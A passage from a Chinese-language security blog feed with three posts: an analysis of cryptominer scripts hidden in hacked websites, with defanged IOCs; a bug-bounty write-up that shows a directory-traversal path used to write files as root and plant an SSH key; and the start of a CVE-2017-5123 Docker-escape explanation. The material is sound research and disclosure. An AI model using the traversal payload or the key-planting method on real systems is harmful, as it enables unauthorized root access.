&lt;p&gt;正如你將在下面看到的，犯罪者現在已經採用這種技術來隱藏在受感染的網站中挖掘加密貨幣的JavaScript，這樣任何訪問該網站的人都將“受到感染”，並且他們的電腦將持續為犯罪者提供加密演算資源。我們將此類活動歸類為惡意行為，因為它未經其許可使用其他人的資源。&lt;/p&gt;

&lt;h2 id=&quot;2使用打包工具隱藏coinhive腳本&quot;&gt;2.使用打包工具隱藏CoinHive腳本&lt;/h2&gt;

&lt;p&gt;在12月28日，FortiGuard實驗室通過一位客戶的關係發現了另一個惡意網站正使用我們上面介紹的混淆技巧 - romance-fire[.]com。該網站包含用於加密貨幣挖掘的混淆惡意代碼。&lt;/p&gt;

&lt;p&gt;我們發現了編碼腳本，並使用&lt;a href=&quot;http://matthewfl.com/unPacker.html&quot;&gt; packer tool &lt;/a&gt;來解壓縮腳本，發現該腳本與CoinHive有連接。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/jyV0AJw.png&quot; alt=&quot;&quot; /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;來自源代碼的JavaScript&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/IjGjCUr.png&quot; alt=&quot;&quot; /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;解壓縮JavaScript - 第1部分&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;我們注意到URL（hxxp：//3117488091/lib/jquery-3.2.1.min.js？v=3.2.11）似乎不是有效的IP或網域。於是我們做了一些研究，我們在&lt;a href=&quot;http://www.kloth.net/services/iplocate.php&quot;&gt;KLOTH.NET&lt;/a&gt;上轉換它後，發現’3117488091’是185.209.23.219的十進制IP。以下是結果：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/jO6HlvS.png&quot; alt=&quot;&quot; /&gt;
該網站將URL轉換為&lt;code class=&quot;highlighter-rouge&quot;&gt;hxxp：//185.209.23.219/lib/jquery-3.2.1.min.js？v=3.2.11)&lt;/code&gt;。我們從該URL中查到相同的JavaScript模式，因此我們再次解壓縮腳本。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/Z32sbbB.png&quot; alt=&quot;&quot; /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;解壓縮JavaScript - 第2部分&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;在最後一輪解包之後，我們終於能夠查看包含CoinHive URL的完整程式碼：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/TU9SUa0.png&quot; alt=&quot;&quot; /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;解壓縮JavaScript - 第3部分&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;3來自github的coin礦工&quot;&gt;3.來自GitHub的Coin礦工&lt;/h2&gt;

&lt;p&gt;2018年1月26日，我們發現了另一個網站 - sorteosrd[。]com，它也通過劫持訪問者的CPU來挖掘加密貨幣。這種加密惡意軟體再次允許劫持者在未經該電腦用戶許可的情況下藉由挖掘數位貨幣受益。我們相信這個網站可能已被挾持或網站管理員自己本身如此使用。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/QNmQTW1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;hxxp：//sorteosrd.com網站的源代碼：&lt;/code&gt;
&lt;img src=&quot;https://i.imgur.com/RSEb8qr.png&quot; alt=&quot;&quot; /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;暗中加密對用戶設備的影響&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;正如我們從上面的截圖中可以看到的那樣，加密貨幣挖礦機在訪問該網站後充分利用其CPU時會大大降低PC的速度。&lt;/p&gt;

&lt;h2 id=&quot;4被挾持的網站---感染cryptocoin挖礦的黑莓&quot;&gt;4.被挾持的網站 - 感染CryptoCoin挖礦的黑莓&lt;/h2&gt;
&lt;p&gt;CoinHive腳本的另一個被挾持的例子是一個絕對會令人驚訝的網站 - blackberrymobile[.]com上發現的。
&lt;img src=&quot;https://i.imgur.com/wjclu4E.png&quot; alt=&quot;&quot; /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;即使是黑莓網站也在短時間內被盜用在挖掘Monero加密貨幣。&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;5被挾持的網站---milk-new-zealand-感染-deepminer-工具&quot;&gt;5.被挾持的網站 - Milk New Zealand 感染 deepMiner 工具&lt;/h2&gt;
&lt;p&gt;此外，我們還發現New Zealand最大的日記農場集團之一──Milk New Zealand也遭到了破壞。我們的AntiVirus實驗室檢測到來自該網站的惡意活動，所以我們查看他的源碼，發現其有使用github上的deepMiner工具，其中發現了一個用於挖掘Monero、Electroneum、Sumokoin等的腳本。請參見下面的截圖：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/QXgfpMu.png&quot; alt=&quot;&quot; /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;使用deepMiner的JavaScript&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;根據上面屏幕截圖中的數據，我們了解到，這種腳本在其網域中使用DDNS，並且只會將CPU使用率增加50％，以使終端用戶受害者的負面使用者體驗不太明顯。&lt;/p&gt;

&lt;h2 id=&quot;6甚至youtube也會通過投放挖礦廣告&quot;&gt;6.甚至YouTube也會通過投放挖礦廣告&lt;/h2&gt;

&lt;p&gt;加密貨幣挖掘惡意軟體的問題越來越嚴重。隨著希望通過劫持CPU以從加密貨幣獲得收益的犯罪者數量不斷增加，加密技術越來越多地出現在惡意軟體中。一周前，一位犯罪者設法將挖礦腳本注入到線上廣告中後，幾個惡意廣告隨即在YouTube上彈出。幸運的是，YouTube迅速發現了該問題，並在兩小時內刪除了受影響的廣告。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/CO4RnSz.png&quot; alt=&quot;&quot; /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;惡意加密YouTube廣告&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;你能做些什麼來防止或避免coin-miner劫持&quot;&gt;你能做些什麼來防止或避免Coin Miner劫持？&lt;/h2&gt;

&lt;p&gt;清除瀏覽器緩存，或安裝ccleaner軟體，從電腦中查找並刪除不需要的文件和無效的Windows註冊表項。
在瀏覽器中禁用JavaScript或運行腳本攔截工具或附加元件。
安裝防病毒軟體，如FortiClient。
安裝並運行AdBlocker或類似的工具，例如Ghostery。
FortiGuard已將此Blog中列出的所有URL列進黑名單。&lt;/p&gt;

&lt;h2 id=&quot;iocs&quot;&gt;IOCs:&lt;/h2&gt;

&lt;p&gt;被挾持的網站：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;acenespargc[.]com&lt;/li&gt;
  &lt;li&gt;www[.]romance-fire[.]com&lt;/li&gt;
  &lt;li&gt;milknewzealand[.]com&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;已觀察到的虛擬貨幣挖掘網址：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;hxxp://coinhive[.]com&lt;/li&gt;
  &lt;li&gt;hxxp://minerhills[.]com&lt;/li&gt;
  &lt;li&gt;hxxp://crypto-webminer[.]com&lt;/li&gt;
  &lt;li&gt;hxxp://sorteosrd[.]com&lt;/li&gt;
  &lt;li&gt;hxxp://greenindex[.]dynamic-dns[.]net&lt;/li&gt;
  &lt;li&gt;hxxps://github[.]com/deepwn/deepMiner&lt;/li&gt;
&lt;/ul&gt;</content><author><name>NotSurprised</name></author><category term="Web" /><category term="Coin Miner" /><category term="Obfuscation Technique" /><summary type="html">威脅研究</summary></entry><entry><title type="html">沒有RCE？那就直接SSH進去啊！</title><link href="https://security-onigiri.github.io//2018/04/18/rcessh.html" rel="alternate" type="text/html" title="沒有RCE？那就直接SSH進去啊！" /><published>2018-04-18T00:00:00+08:00</published><updated>2018-04-18T00:00:00+08:00</updated><id>https://security-onigiri.github.io//2018/04/18/rcessh</id><content type="html" xml:base="https://security-onigiri.github.io//2018/04/18/rcessh.html">&lt;p&gt;&lt;del&gt;何不食肉糜?&lt;/del&gt;&lt;/p&gt;

&lt;p&gt;[&lt;img src=&quot;http://blog.jr0ch17.com/images/2017-11-08_12h39_35.png&quot; alt=&quot;My Profile Photo&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://blog.jr0ch17.com/&quot; title=&quot;link to home of Jasmin Landry, a.k.a JR0ch17&quot;&gt;&lt;strong&gt;Jasmin Landry, a.k.a JR0ch17&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;2018年1月25日 • 在&lt;a href=&quot;http://blog.jr0ch17.com/tags/#bugbounty&quot;&gt;bugbounty &lt;/a&gt;、&lt;a href=&quot;http://blog.jr0ch17.com/tags/#rce&quot;&gt;RCE &lt;/a&gt;、&lt;a href=&quot;http://blog.jr0ch17.com/tags/#shell&quot;&gt;Shell&lt;/a&gt;、&lt;a href=&quot;http://blog.jr0ch17.com/tags/#lfd&quot;&gt;LFD &lt;/a&gt;、&lt;a href=&quot;http://blog.jr0ch17.com/tags/#xss&quot;&gt;XSS &lt;/a&gt;、&lt;a href=&quot;http://blog.jr0ch17.com/tags/#xxe&quot;&gt;XXE &lt;/a&gt;、&lt;a href=&quot;http://blog.jr0ch17.com/tags/#ssh&quot;&gt;SSH &lt;/a&gt;&lt;/p&gt;

&lt;p&gt;這篇博文是關於我的第一篇 &lt;del&gt;RCE&lt;/del&gt; shell（或者隨便你想怎麼叫它），是篇我在2017年夏季獲得了一個Bug Bounty(錯誤賞金)計劃。這絕對沒有什麼特別之處，你甚至可能不會學到任何新東西，但如果你這樣做，我很高興我能幫你！我只是覺得這是一種獲得一個盒子的不同方式，特別是在Bug Bounty方面。&lt;/p&gt;

&lt;h3 id=&quot;偵察總是挺有趣的&quot;&gt;偵察總是挺有趣的&lt;/h3&gt;

&lt;p&gt;使用&lt;a href=&quot;https://github.com/aboul3la/Sublist3r&quot;&gt;Sublist3r&lt;/a&gt;，&lt;a href=&quot;https://github.com/michenriksen/aquatone&quot;&gt;Aquatone&lt;/a&gt;，&lt;a href=&quot;https://nmap.org/&quot;&gt;Nmap&lt;/a&gt;等工具對*.domain.com 範圍內的網域進行定期偵察後，我最終列出了數百個子域。我不知道從哪裡開始，因此我決定使用&lt;a href=&quot;https://github.com/ChrisTruncer/EyeWitness&quot;&gt;EyeWitness&lt;/a&gt;截取網頁截圖，以便了解哪些目標看起來很脆弱，以便我可以從這些截圖開始破冰。在EyeWitness報告中，有一個應用程序在8080埠上運行，它有一個我從未聽說過的CMS的默認主頁，因此我決定首先查看是那個CMS。通過瀏覽目標，我很快找到了一個登錄頁面，幸運的是，我的默認憑據是 &lt;strong&gt;admin：admin&lt;/strong&gt;。然而，它的管理面板中完全沒有任何東西，沒甚麼有料的訊息，完全沒有，它根本是空的。但我仍然決定將它以&lt;strong&gt;“管理面板中的默認憑據”&lt;/strong&gt;為標題的問題報告給Bug Bounty計劃，幸運的是即使我沒有獲得任何敏感訊息，他們也願意將其作為一個重要的bug進行獎勵。&lt;/p&gt;

&lt;h3 id=&quot;jobert的名言&quot;&gt;Jobert的名言&lt;/h3&gt;

&lt;p&gt;僅僅通過默認主頁的外觀以及它在管理面板中的樣子，我覺得應該還有更多細節在裡面。正如&lt;a href=&quot;https://twitter.com/jobertabma&quot;&gt;Jobert&lt;/a&gt;曾經說過的那樣，&lt;em&gt;如果它看起來很老很脆弱，那很可能就是你想的那樣！&lt;/em&gt;我決定看看CMS的網站，看看我能否獲得更多的訊息。這是一個開源軟體，所以我想我會在AWS上啟動一個EC2實例並將它安裝在那裡，以便我可以自己玩。我注意到該服務必須以sudo權限運行，這顯然不是最佳實作方式（稍後請牢記這點）。完成設置後，我做了一個快速的Google搜索，看看能否找到該軟體的任何現有CVE，有趣的是，再也找不到任何東西。所以這意味著很有可能沒有人對此軟體進行安全審查或滲透測試。我知道事實後該秀一波了!
&lt;a href=&quot;https://memecreator.org/static/images/memes/3013268.jpg&quot;&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;簡潔快速的去發現些甚麼吧&quot;&gt;簡潔快速的去發現些甚麼吧&lt;/h3&gt;

&lt;p&gt;我瀏覽了大約30分鐘到一個小時，以便很好地了解它是如何運作的。在我這樣做的時候，我很快找到了2個XSS; 一個存儲型，一個及時反應型。然後在檢查Burp Suite中的所有請求後，我最終找到了1個LFD和2個XXE。它有很多API終端，所以我查看了他們的API文檔，並很快意識到在該CMS上的每個可能的操作都有不正確的訪問控制。這意味著未經身份驗證的遠程攻擊者可以利用存儲的XSS，LFD和兩個XXE攻擊其自身，甚至無需登錄管理頁面。最重要的是，它也沒有CSRF保護，所以如果攻擊者不想利用這些漏洞，他們也可以很容易地創建一些CSRF攻擊並嘗試讓管理員為他們自動做這件事！&lt;/p&gt;

&lt;h3 id=&quot;directory-traversal救世界&quot;&gt;/directory traversal救世界！&lt;/h3&gt;

&lt;p&gt;此時此刻我已經預見，在這個CMS上成功製造RCE只是一個時間的問題。我只是需要繼續探索，然後我最終絕對會找到一個。我之前發現的一個有趣的終端是我可以更新模板文件。它有趣的點是它用於更新模板的參數。下面這就是它的樣子。 &lt;strong&gt;&lt;em&gt;(所有敏感信息已處理)&lt;/em&gt;&lt;/strong&gt;
&lt;img src=&quot;http://blog.jr0ch17.com/images/POST_request.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在成功更新後，回覆將如下所示。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://blog.jr0ch17.com/images/POST_Response.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我必須嘗試的下一個邏輯是將路徑更改為其他內容，用以查看是否可以將文件上傳到&lt;code class=&quot;highlighter-rouge&quot;&gt;/config&lt;/code&gt;文件夾中。所以我給了它如下路徑:&lt;code class=&quot;highlighter-rouge&quot;&gt;/../../../../../../../../../../../../tmp/test.txt&lt;/code&gt;並用&lt;code class=&quot;highlighter-rouge&quot;&gt;This is a test.&lt;/code&gt;替換了POST的主體。我得到了與以前的請求相同的Response…太神啦！但是，我接下來該如何確認該文件是否已真正上傳完成了？不要忘記，這個測試是在我自己的伺服器上完成的，所以我可以自己檢查文件是否在那裡，但這太白箱了。我想走黑箱路線並找到另一種方法來確認這件事。於是就請到LFD來拯救世界啦！使用我已經發現的LFD/directory traversal來幫助我檢查確認文件是否完成上傳。而它真的上去了！ 
&lt;img src=&quot;http://blog.jr0ch17.com/images/LFI.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;沒有rce現在該怎麼辦&quot;&gt;沒有RCE，現在該怎麼辦？&lt;/h3&gt;

&lt;p&gt;好了！現在我知道我們可以上傳文件，而且不僅僅是傳到伺服器上的某些固定位置，我可以將它們上傳到任何我想要的地方，因為服務是以root權限運行。&lt;/p&gt;

&lt;p&gt;當然，下一步是嘗試執行我上傳的文件嗎？那麼，事實證明，對我來說實際上是一個問題。該服務在Tomcat中是作為一個&lt;code class=&quot;highlighter-rouge&quot;&gt;war&lt;/code&gt;文件進行部署，所以沒有一個真正可以上傳和執行文件的特定路徑。也許如果有別人幫助的話，我可能已經想出如何解決這一點的方法，但由於我不太熟悉又沒人幫助，所以我很不幸的在那個時候無法做任何事情往下深入。這讓我回想起我在OSCP工作的日子。我手邊仍然有我的筆記，所以我翻了翻他們，並藉此獲得了一些想法。我首先上傳了一個bash腳本到&lt;code class=&quot;highlighter-rouge&quot;&gt;cron.hourly&lt;/code&gt;資料夾，但使用默認的操作系統配置，但這步棋並沒有成功。假設Bug Bounty計劃具有相同的默認設置，那麼這招很可能也無法成功運作。然後我告訴自己:好吧，我手上有root權限了，為什麼不直接SSH連到盒子裡？&lt;/p&gt;

&lt;p&gt;為此，我必須將我的SSH密鑰上傳到伺服器。這很簡單，我只需要相應地配置路徑參數，並將我的SSH密鑰放在POST請求的主體中。 
&lt;img src=&quot;http://blog.jr0ch17.com/images/SSH.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;剩下的最後一件事就是嘗試用我新上傳的SSH密鑰登錄。你看看，這不就成功了？&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://blog.jr0ch17.com/images/ID.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;現在我已經完成了我的目標，我決定是時候報告這些錯誤了。我聯繫了CMS的開發團隊，讓他們知道這些漏洞，他們立即回答我是否想加入他們的Slack團隊，以便我們可以更多地討論我的報告。我們通過幾次電話聯繫來澄清幾點，他們讓我在更新發布之前先測試看看他們的新版本。&lt;/p&gt;

&lt;p&gt;我還將這些錯誤報告給使用該CMS的Bug Bounty計劃。我顯然沒有在他們的網站上測試任何東西，因為它不符合道德規範，但我確實為我的所有發現提供了一個清晰的PoC，要求他們測試他們的結果。我的所有報告都經過了驗證並被接受，其中也一併包括SSH密鑰的文件上傳的部分。這是我被認可的第一個“RCE”的Bug Bounty計劃！&lt;/p&gt;

&lt;p&gt;如有任何問題或意見，請不要猶豫，直接在Twitter上DM我吧~ :)&lt;/p&gt;</content><author><name>NotSurprised</name></author><category term="Web" /><category term="Bug Bounty" /><category term="Penetration Test" /><summary type="html">何不食肉糜?</summary></entry><entry><title type="html">使用 CVE-2017-5123 逃離 Docker 容器</title><link href="https://security-onigiri.github.io//2018/03/31/Escaping-Docker-container-using-CVE-2017-5123.html" rel="alternate" type="text/html" title="使用 CVE-2017-5123 逃離 Docker 容器" /><published>2018-03-31T00:00:00+08:00</published><updated>2018-03-31T00:00:00+08:00</updated><id>https://security-onigiri.github.io//2018/03/31/Escaping-Docker-container-using-CVE-2017-5123</id><content type="html" xml:base="https://security-onigiri.github.io//2018/03/31/Escaping-Docker-container-using-CVE-2017-5123.html">&lt;p&gt;The post describes how I exploited the &lt;code class=&quot;highlighter-rouge&quot;&gt;waitid()&lt;/code&gt; vulnerability in order to modify the &lt;a href=&quot;https://www.kernel.org/pub/linux/libs/security/linux-privs/kernel-2.2/capfaq-0.2.txt&quot;&gt;Linux capabilities&lt;/a&gt; of a Docker container to gain elevated privileges, and ultimately escape the container jail. If you wnat to see how Twistlock would stop this vulnerability in its tracks, check out my follow up blog.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;這篇文章描述我如何利用 &lt;code class=&quot;highlighter-rouge&quot;&gt;waitid()&lt;/code&gt; 修改 Docker 容器的 Linux capabilities 從而取得更高的權限，最後逃離了容器監獄。如果你想要看看 Twistlock 如何在他的軌跡中阻止這個弱點，在這篇&lt;a href=&quot;https://www.twistlock.com/2018/01/16/blocking-malicious-behavior-exploits-containers-twistlock/&quot;&gt;文章&lt;/a&gt;有。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;But before we dive in, since an image is worth a thousand words, here is my exploit in action. It modifies the containerized process capabilities structure in memory, resulting in a gain of &lt;code class=&quot;highlighter-rouge&quot;&gt;CAP_SYS_ADMIN&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;CAP_NET_ADMIN&lt;/code&gt; capabilities. This results in the ability to enable promiscuous mode on &lt;code class=&quot;highlighter-rouge&quot;&gt;eth0&lt;/code&gt;(docker bridge for the container):&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;但在我們深入之前，一張圖勝過千言萬語，這是我的利用過程。它修改容器化行程在記憶體中的 capabilities 結構，導致取得 &lt;code class=&quot;highlighter-rouge&quot;&gt;CAP_SYS_ADMIN&lt;/code&gt; 與 &lt;code class=&quot;highlighter-rouge&quot;&gt;CAP_NET_ADMIN&lt;/code&gt; capabilities。這意味著有能力開啟 &lt;code class=&quot;highlighter-rouge&quot;&gt;eth0&lt;/code&gt;(容器的 docker bridge) 的混沌模式&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=IdRDFS4u2rQ&quot;&gt;Youtube 影片&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Note that I have turn off &lt;code class=&quot;highlighter-rouge&quot;&gt;Kernel ASLR&lt;/code&gt; for the recording, but it also works with &lt;code class=&quot;highlighter-rouge&quot;&gt;KASLR&lt;/code&gt; as we can find the kernel base and the heap base by using the same vulnerability.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;請留意我在影片中已經關掉 &lt;code class=&quot;highlighter-rouge&quot;&gt;Kernel ASLR&lt;/code&gt;，但在 &lt;code class=&quot;highlighter-rouge&quot;&gt;KASLR&lt;/code&gt; 的狀態下依然可以藉由同一個弱點成功找到核心基址與堆積基址。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;CVE-2017-5123 was published earlier this year on Oct 12 - it was a Linux kernel vulnerability in the &lt;code class=&quot;highlighter-rouge&quot;&gt;waitid()&lt;/code&gt; syscall for 4.12-4.13 kernel versions. The &lt;code class=&quot;highlighter-rouge&quot;&gt;waitid()&lt;/code&gt; syscall defined as:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;a href=&quot;https://access.redhat.com/security/cve/cve-2017-5123&quot;&gt;CVE-2017-5123&lt;/a&gt; 是今年 8 月 12 日發布 - 它是一個在 &lt;code class=&quot;highlighter-rouge&quot;&gt;waitid()&lt;/code&gt; 系統呼叫的 Linux 核心 4.12-4.13 版本弱點。&lt;code class=&quot;highlighter-rouge&quot;&gt;waitid()&lt;/code&gt; 系統呼叫定義為：&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-clike&quot;&gt;int waitid(idtype_t idtype, it_t id, siginfo_t *infop, int options);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The vulnerability allows an attacker to write a partially-controlled data to kernel memory address of his choice. The kernel memory address can be provided as the&lt;code class=&quot;highlighter-rouge&quot;&gt;infop&lt;/code&gt;pointer above. The pointer points to a struct siginfo described below. In this struct we can control sveral variables, specifically pid and status.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;該弱點允許一個攻擊者寫入部份可控資料到攻擊者選擇的核心記憶體位址中。核心記憶體位址可以由&lt;code class=&quot;highlighter-rouge&quot;&gt;infop&lt;/code&gt;指標提供。這個指標指向一個結構&lt;code class=&quot;highlighter-rouge&quot;&gt;siginfo&lt;/code&gt;如下所述。在這個結構我們可以控制數個變數，特別是&lt;code class=&quot;highlighter-rouge&quot;&gt;pid&lt;/code&gt;與&lt;code class=&quot;highlighter-rouge&quot;&gt;status&lt;/code&gt;。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;As you can see below, the control is rather indirect.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;下面如你所見，這個控制相當不直接。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-clike&quot;&gt;struct siginfo {
    int si_signo;
    int si_errno;
    int si_code;
    int padding; // this remains unchaged by waitid
    int pid;     // process id
    int uid;     // user id
    int status;  // return code
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Most of the values cannot be controlled by us or are limited in their size for our needs, however we can control the &lt;code class=&quot;highlighter-rouge&quot;&gt;pid&lt;/code&gt; value by creating a lot of processes with the help of &lt;code class=&quot;highlighter-rouge&quot;&gt;fork()&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;clone()&lt;/code&gt; until we hit the desired &lt;code class=&quot;highlighter-rouge&quot;&gt;pid&lt;/code&gt; value. Still, we are limited by the &lt;code class=&quot;highlighter-rouge&quot;&gt;PID_MAX&lt;/code&gt; value of the system, which is by default configured to be 32768 which equals to 0x8000 in hex.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;多數的數值無法被我們控制，或是對我們來說在大小方面有所限制，然而我們可以藉由&lt;code class=&quot;highlighter-rouge&quot;&gt;fork()&lt;/code&gt;或&lt;code class=&quot;highlighter-rouge&quot;&gt;clone()&lt;/code&gt;的幫助創造很多行程，來控制 &lt;code class=&quot;highlighter-rouge&quot;&gt;pid&lt;/code&gt;的值，直到我們觸碰到想要的&lt;code class=&quot;highlighter-rouge&quot;&gt;pid&lt;/code&gt;為止。但我們仍受限於系統中&lt;code class=&quot;highlighter-rouge&quot;&gt;PID_MAX&lt;/code&gt;的值，預設為 &lt;em&gt;32768&lt;/em&gt; 等於 十六進位 &lt;em&gt;0x8000&lt;/em&gt;。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Note: In a non-containerized environment we could elevate this number after changing our &lt;code class=&quot;highlighter-rouge&quot;&gt;uid&lt;/code&gt; to 0 and gain root privileges, as we could modify &lt;code class=&quot;highlighter-rouge&quot;&gt;/proc/sys/kernel/pid_mx&lt;/code&gt; to any number.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;註：在一個非容器的環境，我們可以在將 &lt;code class=&quot;highlighter-rouge&quot;&gt;uid&lt;/code&gt; 設為0後提高這個數字，並取得 root 權限，如同我們可以修改 &lt;code class=&quot;highlighter-rouge&quot;&gt;/proc/sys/kernel/pid_max&lt;/code&gt; 為任何數字。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;linux-capabilities&quot;&gt;Linux Capabilities&lt;/h2&gt;

&lt;p&gt;In this section I’ll focus on a short overview of Linux capabilities - what they are, how Docker uses them, and how they are represented in the memory.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;在這個章節我將專注在簡短概觀的 Linux capabilities - 它們是什麼，與Docker 如何使用它們，與它們在記憶體中如何被表示。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The code snippet below is taken from &lt;em&gt;linux/cred.h&lt;/em&gt; and is the definition of the credentails struct that each process has:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;下方是從 &lt;a href=&quot;https://github.com/torvalds/linux/blob/master/include/linux/cred.h&quot;&gt;linux/cred.h&lt;/a&gt; 擷取的程式碼片段 ，為每個行程的認證資訊結構：&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-clike&quot;&gt;struct cred {
    atomic_t usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
    atomic_t subscribers; /* number of processes subscribed */
    void *put_addr;
    unsigned magic;
#define CRED_MAGIC 0x43736564
#define CRED_MAGIC_DEAD 0x44656144
#endif
    kuid_t uid; /* real UID of the task */
    kgid_t gid; /* real GID of the task */
    kuid_t suid; /* saved UID of the task */
    kgid_t sgid; /* saved GID of the task */
    kgid_t euid; /* effective UID of the task */
    kuid_t egid; /* effective GID of the task */
    kuid_t fsuid; /* UID for VFS ops */
    kgid_t fsgid /* GID for VFS ops */
    Unsigned securebits; /* SUID-less security management */
    Kernel_cap_t cap_inheritable; /* caps our children can inherit */
    Kernel_cap_t cap_permitted; /* caps we're permitted */
    Kernel_cap_t cap_effective; /* caps we can actually use */
    Kernel_cap_t cap_ambient; /* Ambient capability set */
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;man capabilities:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Starting with kernel 2.2, Linux divides the privileges traditionally associated with superuse into distinc units, known as &lt;em&gt;capabilities&lt;/em&gt;, which can be independently enabled and disabled. Capabilities are a per-thread attribute.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;從核心 2.2開始，Linux 將傳統與超級使用者相關聯的權限分成不同的單元，可被個別啟用及停用，並稱之為 &lt;em&gt;capabilities&lt;/em&gt;。每個執行緒都會有各自的 Capabilities 屬性。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Linux capabilities are stored inside each process’s own &lt;code class=&quot;highlighter-rouge&quot;&gt;cred struct&lt;/code&gt; and represented by a bitmask. For example all caps enabled would be represented by a bitmask of &lt;code class=&quot;highlighter-rouge&quot;&gt;0xFFFFFFFFFFFFFFFF
&lt;/code&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Linux capabilities 被儲存在每個行程自己的 &lt;code class=&quot;highlighter-rouge&quot;&gt;cred struct&lt;/code&gt; 並使用 bitmask 來表示。例如所有的 caps 都被啟用的話，則用 bitmask 表示成 &lt;code class=&quot;highlighter-rouge&quot;&gt;0xFFFFFFFFFFFFFFFF
&lt;/code&gt;。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Each capability provides a different set of permissions, for instance:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;每個 capability 提供一個不同的權限分配，舉例來說:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;CAP_SYS_MODULE&lt;/strong&gt; - allows for loading &amp;amp; unloading kernel modules.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;CAP_NET_ADMIN&lt;/strong&gt; - allows for various network operations. For example entering promiscuous mode, interface configuration and more.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;CAP_SYS_ADMIN&lt;/strong&gt; - enables a range of system administration operations such as quotactl, mount, umount, swapon, setdomainname, ptrace and much more(this cap gives the most privileges and overloads others).&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;CAP_SYS_MODULE&lt;/strong&gt; - 允許載入或卸載核心模組。&lt;/p&gt;

  &lt;p&gt;&lt;strong&gt;CAP_NET_ADMIN&lt;/strong&gt; - 允許數種網路操作，例如開啟混沌模式，介面設定等等。&lt;/p&gt;

  &lt;p&gt;&lt;strong&gt;CAP_SYS_ADMIN&lt;/strong&gt; - 啟用一個範圍內的系統管理操作，如 quotactl, mount, umount, swapon, setdomainname, ptrace 等等(這個 cap 給了最多權限並會多載其他的 cap)。
